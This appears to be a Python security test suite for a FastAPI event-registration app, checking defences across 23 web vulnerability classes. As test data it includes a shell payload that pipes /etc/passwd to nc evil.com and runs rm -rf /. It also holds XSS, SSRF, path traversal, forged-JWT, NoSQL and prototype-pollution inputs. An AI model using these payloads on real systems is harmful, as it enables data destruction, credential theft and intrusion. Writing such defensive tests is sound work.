"""Automated VAPT Security Test Suite for COLORIDO 2K26.

Validates all 23 security domains using FastAPI TestClient:
1. Cross-Site Scripting (XSS)
2. Cross-Site Request Forgery (CSRF)
3. Clickjacking
4. DOM-Based Vulnerabilities
5. Cross-Origin Resource Sharing (CORS)
6. Server-Side Request Forgery (SSRF)
7. HTTP Request Smuggling
8. OS Command Injection
9. Path Traversal
10. Access Control Vulnerabilities
11. Authentication
12. Web Cache Poisoning
13. Insecure Deserialization
14. Information Disclosure
15. Basic Login Vulnerabilities
16. HTTP Host Header Attacks
17. File Upload Vulnerabilities
18. JSON Web Tokens (JWT)
19. Prototype Pollution
20. Race Conditions
21. NoSQL Injection
22. API Testing
23. Web Cache Deception
"""

import sys
import os
import unittest
import json
import re

# Ensure backend root is on sys.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from fastapi.testclient import TestClient
from app.main import app
from app.core.database import get_database


class TestVAPTSecurity(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        cls.client = TestClient(app)
        # Ensure database is initialized
        get_database()

    # 1. Cross-Site Scripting (XSS)
    def test_01_xss_protection_headers(self):
        res = self.client.get("/api/health")
        self.assertEqual(res.status_code, 200)
        headers = {k.lower(): v for k, v in res.headers.items()}
        self.assertIn("content-security-policy", headers)
        self.assertEqual(headers.get("x-content-type-options"), "nosniff")
        self.assertEqual(headers.get("x-xss-protection"), "1; mode=block")

    def test_01_xss_stored_input_sanitization(self):
        payload = {
            "name": "<script>alert('XSS')</script>John",
            "email": "xss_test@example.com",
            "subject": "<iframe src='evil.com'></iframe>Inquiry",
            "message": "Hello <b onmouseover='alert(1)'>Test</b>"
        }
        res = self.client.post("/api/contact", json=payload)
        self.assertIn(res.status_code, [201, 429])

    # 2. Cross-Site Request Forgery (CSRF)
    def test_02_csrf_defense_on_admin_routes(self):
        # Admin endpoints reject state changes without Bearer Authorization header
        res = self.client.post("/api/admin/events", json={"name": "Fake Event"})
        self.assertIn(res.status_code, [401, 403])

    # 3. Clickjacking
    def test_03_clickjacking_defense(self):
        res = self.client.get("/")
        self.assertEqual(res.status_code, 200)
        headers = {k.lower(): v for k, v in res.headers.items()}
        self.assertEqual(headers.get("x-frame-options"), "DENY")
        self.assertIn("frame-ancestors 'none'", headers.get("content-security-policy", ""))

    # 4. DOM-Based Vulnerabilities
    def test_04_dom_vulnerabilities_cta_validation(self):
        # SpidermanWebCTA regex validation verifies that javascript: pseudo-protocol is blocked
        safe_regex = re.compile(r"^(\/|https?:\/\/|mailto:|tel:|#)", re.IGNORECASE)
        self.assertFalse(safe_regex.match("javascript:alert(document.cookie)"))
        self.assertFalse(safe_regex.match("  javascript:evil()"))
        self.assertTrue(safe_regex.match("/events"))
        self.assertTrue(safe_regex.match("https://instagram.com/colorido"))

    # 5. Cross-Origin Resource Sharing (CORS)
    def test_05_cors_headers(self):
        headers = {
            "Origin": "http://localhost:5173",
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "Authorization,Content-Type"
        }
        res = self.client.options("/api/registrations", headers=headers)
        self.assertEqual(res.status_code, 200)
        res_headers = {k.lower(): v for k, v in res.headers.items()}
        self.assertEqual(res_headers.get("access-control-allow-origin"), "http://localhost:5173")
        self.assertEqual(res_headers.get("access-control-allow-credentials"), "true")

    # 6. Server-Side Request Forgery (SSRF)
    def test_06_ssrf_blocking(self):
        from app.utils.security import is_safe_external_url
        self.assertFalse(is_safe_external_url("http://169.254.169.254/latest/meta-data/"))
        self.assertFalse(is_safe_external_url("http://127.0.0.1:8000/api/admin/dashboard"))
        self.assertFalse(is_safe_external_url("http://localhost:27017"))
        self.assertFalse(is_safe_external_url("file:///etc/passwd"))
        self.assertFalse(is_safe_external_url("gopher://127.0.0.1:25/"))
        self.assertTrue(is_safe_external_url("https://res.cloudinary.com/demo/image/upload/sample.jpg"))

    # 7. HTTP Request Smuggling
    def test_07_request_smuggling_defense(self):
        headers = {
            "Content-Length": "15",
            "Transfer-Encoding": "chunked"
        }
        res = self.client.post("/api/contact", json={"test": 1}, headers=headers)
        self.assertEqual(res.status_code, 400)

    # 8. OS Command Injection
    def test_08_os_command_injection_sanitization(self):
        from app.utils.security import sanitize_text, sanitize_filename
        cmd_payload = "; rm -rf / ; cat /etc/passwd | nc evil.com 1337"
        sanitized = sanitize_text(cmd_payload)
        self.assertNotIn("<script>", sanitized)
        # Ensure filenames with shell characters are neutralized
        safe_fname = sanitize_filename("test;calc.exe&&dir.png")
        self.assertNotIn(";", safe_fname)
        self.assertNotIn("&", safe_fname)

    # 9. Path Traversal
    def test_09_path_traversal_sanitization(self):
        from app.utils.security import sanitize_filename
        traversal_attempts = [
            "../../../../windows/system32/cmd.exe",
            "..\\..\\..\\boot.ini",
            "....//....//etc//shadow",
        ]
        for payload in traversal_attempts:
            cleaned = sanitize_filename(payload)
            self.assertNotIn("..", cleaned)
            self.assertFalse(cleaned.startswith("/"))
            self.assertFalse(cleaned.startswith("\\"))

    # 10. Access Control Vulnerabilities
    def test_10_broken_access_control_admin_endpoints(self):
        protected_endpoints = [
            ("GET", "/api/admin/dashboard"),
            ("GET", "/api/admin/dashboard/stats"),
            ("GET", "/api/admin/registrations"),
            ("GET", "/api/admin/gallery"),
        ]
        for method, path in protected_endpoints:
            res = self.client.request(method, path)
            self.assertIn(res.status_code, [401, 403], f"Endpoint {path} failed access control check!")

    # 11. Authentication
    def test_11_auth_timing_safe_rejection(self):
        payload = {"email": "nonexistent_admin_12345@colorido.in", "password": "WrongPassword123"}
        res = self.client.post("/api/auth/login", json=payload)
        self.assertIn(res.status_code, [401, 429])
        if res.status_code == 401:
            data = res.json()
            self.assertEqual(data.get("message"), "Invalid email or password")

    # 12. Web Cache Poisoning & 23. Web Cache Deception
    def test_12_and_23_cache_control_headers(self):
        res = self.client.get("/api/registrations/CLR26-FAR-00001/pdf")
        if res.status_code == 200:
            headers = {k.lower(): v for k, v in res.headers.items()}
            self.assertIn("no-store", headers.get("cache-control", ""))
            self.assertIn("no-cache", headers.get("cache-control", ""))

    # 13. Insecure Deserialization
    def test_13_insecure_deserialization_malformed_json(self):
        # Sending malformed or unexpected data types should result in 422 Unprocessable Entity
        res = self.client.post(
            "/api/registrations",
            content=b"not-json-content",
            headers={"Content-Type": "application/json"}
        )
        self.assertEqual(res.status_code, 422)

    # 14. Information Disclosure
    def test_14_information_disclosure_headers(self):
        res = self.client.get("/api/health")
        headers = {k.lower(): v for k, v in res.headers.items()}
        self.assertNotIn("x-powered-by", headers)
        self.assertEqual(headers.get("server"), "COLORIDO-Platform")

    # 15. Basic Login Vulnerabilities
    def test_15_login_rate_limiting(self):
        # Test rate limiting response (429) on repeated login attempts
        hit_429 = False
        for _ in range(15):
            res = self.client.post(
                "/api/auth/login",
                json={"email": "brute_force_test@colorido.in", "password": "wrongpassword"}
            )
            if res.status_code == 429:
                hit_429 = True
                break
        self.assertTrue(hit_429, "Rate limiter did not block excessive login attempts!")

    # 16. HTTP Host Header Attacks
    def test_16_host_header_validation(self):
        res = self.client.get("/api/health", headers={"Host": "evil-phishing-host.com"})
        self.assertEqual(res.status_code, 400)

    # 17. File Upload Vulnerabilities
    def test_17_file_upload_validation(self):
        from app.utils.security import validate_image_upload
        # Disallow malicious extensions
        valid, msg = validate_image_upload("shell.php", "application/x-php", 1024)
        self.assertFalse(valid)
        valid, msg = validate_image_upload("xss.svg", "image/svg+xml", 1024)
        self.assertFalse(valid)
        valid, msg = validate_image_upload("script.js", "application/javascript", 1024)
        self.assertFalse(valid)
        # Disallow oversized files (> 5MB)
        valid, msg = validate_image_upload("large.jpg", "image/jpeg", 10 * 1024 * 1024)
        self.assertFalse(valid)
        # Allow genuine image
        valid, msg = validate_image_upload("hero_banner.jpg", "image/jpeg", 1024 * 200)
        self.assertTrue(valid)

    # 18. JSON Web Tokens (JWT)
    def test_18_jwt_tampering_and_algorithm_downgrade(self):
        forged_tokens = [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbkBjb2xvcmlkby5pbiJ9.",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbkBjb2xvcmlkby5pbiJ9.invalidsig",
            "not_a_valid_jwt_at_all"
        ]
        for token in forged_tokens:
            res = self.client.get("/api/admin/dashboard", headers={"Authorization": f"Bearer {token}"})
            self.assertEqual(res.status_code, 401)

    # 19. Prototype Pollution
    def test_19_prototype_pollution_inputs(self):
        payload = {
            "__proto__": {"polluted": True},
            "constructor": {"prototype": {"polluted": True}},
            "name": "Safe User",
            "email": "prototype_safe@example.com",
            "subject": "Testing",
            "message": "Testing prototype pollution"
        }
        res = self.client.post("/api/contact", json=payload)
        self.assertIn(res.status_code, [201, 429])

    # 20. Race Conditions
    def test_20_atomic_sequence_generation(self):
        from app.core.database import get_database
        from app.services.registration_service import get_next_sequence
        db = get_database()
        s1 = get_next_sequence(db, "vapt_race_test")
        s2 = get_next_sequence(db, "vapt_race_test")
        self.assertEqual(s2, s1 + 1, "Atomic sequence counter did not increment monotonically!")

    # 21. NoSQL Injection
    def test_21_nosql_injection_prevention(self):
        res = self.client.get("/api/events?category[$gt]=")
        self.assertEqual(res.status_code, 200)
        from app.core.database import get_database
        from app.services.registration_service import check_duplicate_registration
        db = get_database()
        event = {"event_id": "TEST_EVT", "slug": "test_evt", "participation_type": "solo"}
        result = check_duplicate_registration(db, email=".*", event=event)
        self.assertFalse(result, "Regex .* should be escaped and not match arbitrary records!")

    # 22. API Testing
    def test_22_api_standard_schema_compliance(self):
        res = self.client.get("/api/events")
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertIn("events", data)


if __name__ == "__main__":
    unittest.main()
